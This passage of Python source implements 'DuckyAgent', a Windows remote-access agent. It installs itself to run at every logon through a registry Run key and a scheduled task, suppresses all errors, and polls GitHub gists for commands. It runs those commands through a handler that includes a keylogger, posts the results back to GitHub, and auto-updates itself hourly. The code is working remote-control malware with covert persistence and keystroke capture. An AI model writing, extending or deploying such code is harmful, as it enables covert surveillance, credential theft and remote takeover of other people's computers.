        f.write(f'@echo off\n')
        f.write(f'start /B pythonw "{agent_path}" --run\n')

    # Add to Windows startup via registry (HKCU - current user only)
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "DuckyAgent", 0, winreg.REG_SZ, bat_path)
        winreg.CloseKey(key)
    except Exception:
        pass

    # Also add as a scheduled task (backup if registry entry is deleted)
    try:
        import xml.etree.ElementTree as ET
        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>{bat_path}</Command>
    </Exec>
  </Actions>
  <Settings>
    <StartWhenAvailable>false</StartWhenAvailable>
    <AllowHardTerminate>true</AllowHardTerminate>
  </Settings>
</Task>'''

        task_name = "DuckyAgent"
        subprocess.Popen(
            ["schtasks", "/Create", "/TN", task_name, "/XML", task_xml, "/F"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass  # Silent fail - registry entry is enough

    return True


def uninstall_agent():
    """Remove DuckyAgent from Windows startup."""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "DuckyAgent")
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception:
        pass

    try:
        subprocess.Popen(
            ["schtasks", "/Delete", "/TN", "DuckyAgent", "/F"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass


# ── Main Agent Loop ────────────────────────────────────────────

def run_agent():
    """Main agent loop - polls GitHub and handles commands."""
    config = load_config()

    # Initialize components
    command_handler = CommandHandler()
    github = GitHubRelay(
        config.get("github", "command_url", fallback=DEFAULT_GIST_COMMAND),
        config.get("github", "response_url", fallback=DEFAULT_GIST_RESPONSE),
        config.get("github", "token", fallback=GITHUB_TOKEN),
    )

    poll_interval = float(config.get("agent", "poll_interval", fallback=str(POLL_INTERVAL)))

    # Start local HTTP server (for local access)
    local_port = int(config.get("agent", "local_port", fallback=str(LOCAL_PORT)))
    http_server = None
    try:
        httpd = HTTPServer(("127.0.0.1", local_port), AgentHTTPHandler)
        http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
        http_thread.start()
        http_server = httpd
    except OSError as e:
        pass  # Port already in use - that's fine

    # Start auto-update thread (checks every hour)
    update_thread = threading.Thread(target=auto_update_loop, daemon=True)
    update_thread.start()

    print(f"DuckyAgent v1.0 started (PID: {os.getpid()})")
    if http_server:
        print(f"Local HTTP server on port {local_port}")
    print("Polling GitHub every {}s...".format(poll_interval))

    running = [True]
    def handle_signal(sig, frame):
        running[0] = False
        command_handler.keylogger.stop()

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    last_command = ""  # Track to avoid re-processing same command

    while running[0]:
        try:
            # Fetch new command from GitHub
            cmd, args = github.get_command()

            if cmd and cmd != last_command:
                last_command = cmd
                print(f"[CMD] {cmd} {args}")

                # Handle the command
                response = command_handler.handle(cmd, args)

                # Send response back to GitHub
                github.set_response(response)

        except Exception as e:
            pass  # Silently continue on any error

        time.sleep(poll_interval)

    # Cleanup
    if http_server:
        http_server.shutdown()
    command_handler.keylogger.stop()


# ── Entry Point ────────────────────────────────────────────────

def main():
    args = sys.argv[1:]

    if '--install' in args:
        print("Installing DuckyAgent...")
        install_agent()
        print("Done! Agent will run on every boot.")

    elif '--uninstall' in args:
        print("Uninstalling DuckyAgent...")
        uninstall_agent()
        print("Done!")

    else:
        # Default: run as agent
        run_agent()


if __name__ == '__main__':
    main()
